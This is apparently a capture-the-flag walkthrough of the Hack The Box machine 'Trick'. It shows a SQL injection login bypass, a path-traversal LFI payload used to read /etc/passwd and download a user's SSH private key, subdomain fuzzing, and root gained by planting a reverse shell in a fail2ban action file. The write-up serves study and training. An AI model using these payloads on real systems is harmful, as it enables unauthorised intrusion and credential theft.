## HTTP
Viewing the site we see a box to enter an email address and receive updates when the site launches:  
![1](Pasted image 20221027152905.png)

Filled out w/ a dummie email address and the link provided points here:
https://startbootstrap.com/solution/contact-forms

Reviewing Wappalyzer it looks like the broostrap version (UI) is: Boostrap 5.1.3
No Robots.txt
No /admin

## SMTP
Quick test to see if root is a valid SMTP user, and it is:
```bash
â”Œâ”€â”€(ghohstã‰¿kali)-[~]
â””â”€$ nc -nv 10.10.11.166 25     
(UNKNOWN) [10.10.11.166] 25 (smtp) open

VRFY admin
550 5.1.1 <admin>: Recipient address rejected: User unknown in local recipient table
VRFY test
550 5.1.1 <test>: Recipient address rejected: User unknown in local recipient table
quit
221 2.0.0 Bye
```
I wasn't necessarily intending on going much deeper here, but we'll hold onto this info for later. Probably just facilitating the user of the dummy form fields we're seeing.

## DNS Part 1
We know port 53 is open. This was a bit of a shot in the dark with 'trick.htb', but produced a few results, namely this new CNAME:
````bash
â”Œâ”€â”€(ghohstã‰¿kali)-[~/Documents/HTB/Trick]
â””â”€$ dig axfr trick.htb @10.10.11.166                                                                                        10 â¨¯

;; XFR size: 6 records (messages 1, bytes 231)
````

Added trick.htb and this new CNAME (preprod-payroll.trick.htb) to my /etc/hosts file to browse them:
```
â”Œâ”€â”€(rootðŸ’€kali)-[/home/ghohst/Documents/HTB/Trick]
â””â”€# sudo echo 10.10.11.166 trick.htb >> /etc/hosts

â”Œâ”€â”€(rootðŸ’€kali)-[/home/ghohst/Documents/HTB/Trick]
â””â”€# sudo echo 10.10.11.166 preprod-payroll.trick.htb >> /etc/hosts
```

## SQLi
The preprod CNAME redirects to /login.php with a login form:  
![2](Pasted image 20221027160154.png)

A straight up blind test of
```
' OR 1=1;#
```
in the username field pushed us to what appears to be the Admin page (indicating the site is vulnerable to SQL Injection). Admittedly, this was just out of habit to enter this in - I can't imagine I get this lucky elsewhere:  
![3](Pasted image 20221027160332.png)

## HTTP Part 2
Doesn't seem to be a whole lot on this page, I can reset the Administrator's password, but that doesn't really matter because we can just bypass the logon anyway - so we'll leave it alone. Documenting this image here which contains the username 'Enemigosss' in case that becomes relevant later on:  
![4](Pasted image 20221027161216.png)

There is an employee list that may be valuable later, with one employee John Smith:
![5](Pasted image 20221027161744.png)

After browsing the site there isn't really a whole lot happening and perhaps this is the rabbit hole that 'trick' wants us to dig ourselves into.

## DNS Part 2
We'll pivot here and see if maybe there are some other sub-domains that were hidden along with preprod-payroll. My thinking is that was the hint (a sub-domain prepended by 'preprod-'), but further enumeration is required. I initially started out trying to FUZZ w/ DirBuster, but it wasn't getting me anywhere - I don't think gobuster is necessarily designed for this kind of thing.

### FFUF
Started with a basic FFUF scan to exclude 404's, but they all came  back 200s anyway :|
```bash
â”Œâ”€â”€(ghohstã‰¿kali)-[~]
â””â”€$ ffuf -u http://trick.htb -H "Host:preprod-FUZZ.trick.htb" -w /usr/share/wordlists/dirb/common.txt -fc 404
```

Filtered by both words and size (-fw, -fs) and am getting one result that is unique, so we'll start there:
```bash
â”Œâ”€â”€(ghohstã‰¿kali)-[~]
â””â”€$ ffuf -u http://trick.htb -H "Host:preprod-FUZZ.trick.htb" -w /usr/share/wordlists/dirb/common.txt -fs 5480

Keep in mind that this is preprod-marketing.trick.htb because of where I placed the FUZZ. This isn't marketing.trick.htb:
```bash
â”Œâ”€â”€(rootðŸ’€kali)-[/home/ghohst/Documents/HTB/Trick]
â””â”€# sudo echo 10.10.11.166 preprod-marketing.trick.htb >> /etc/hosts
```

and this gets us access to a new site:
![[Pasted image 20221027172111.png]]

FUZZing past this point doesn't get us much more:
```bash
â”Œâ”€â”€(ghohstã‰¿kali)-[~]
â””â”€$ ffuf -u http://preprod-marketing.trick.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt

## HTTP Part 3 / LFI
Navigating around this new site, there also isn't a whole lot happening. Identified a form file and entered in dummy info and email - nothing new to see. XSS doesn't seem possible as it isn't outputting anything helpful, either.

We do see that the address bar is showing Page= at the end of each navigation - indicating local file inclusion may be possible/is happening:  
![6](Pasted image 20221027174044.png)

After quite a bit of trial and error, I was able to get the site to leak /etc/passwd. [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion) was super helpful here.
```
http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd
```

The only interesting entry in /etc/passwd was 'Michael'
```
michael:x:1001:1001::/home/michael:/bin/bash
```

Michael does have an ssh folder and id_rsa (private key), so we'll navigate there and confirm it's presence, and then wget it down to our machine:
```
http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa
```

```bash
wget http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa -O id_rsa
```

# Exploitation
SSH Key in hand, we can attempt to connect to the server via command line. Now, one thing that threw me off was that it kept asking for a password because permissions were 'too open', so using chmod to bring it down to 600 seemed to do the trick:
```bash
â”Œâ”€â”€(ghohstã‰¿kali)-[~/Documents/HTB/Trick]
â””â”€$ chmod 600 id_rsa             

â”Œâ”€â”€(ghohstã‰¿kali)-[~/Documents/HTB/Trick]
â””â”€$ ssh michael@trick.htb -i ./id_rsa

michael@trick:~$
```

I have access to shell now and cat'd out the user flag. Running Sudo -l we can see that Michael can run this fail2ban restart as root, so we'll start researching Fail2Ban and determine what can be done here:
```bash
michael@trick:~/Downloads$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

# Privilege Escalation

There weren't many articles, but [this one on medium](https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7) seems to explain it best.
I copied over the iptables-multiport.conf file to Michaels' user directory (couldn't be edited in place):
```bash
cp /etc/fail2ban/action.d/iptables-multiport.conf ./
```

Edited the file to initiate a reverse shell under the value for <b>ACTIONBAN</b>:

![7](Pasted image 20221027181402.png)

Moved the file back over to /etc/fail2ban and overwrote what was there:
```bash
mv iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf
```

I DID NOT RESTART FAIL2BAN

I cat'd out the file to make sure the code was still there, started up a listener, attempted to SSH 3 times (failing), the listener picked up, I moved to the /root folder and cat'd out root.txt. I had to go through the process a few times (copying the file, manipulating the file, moving it over) because after a brief few moments the file would revert back to its original form (especially when restarting the service!). Ultimately, I was able to grab the flag.
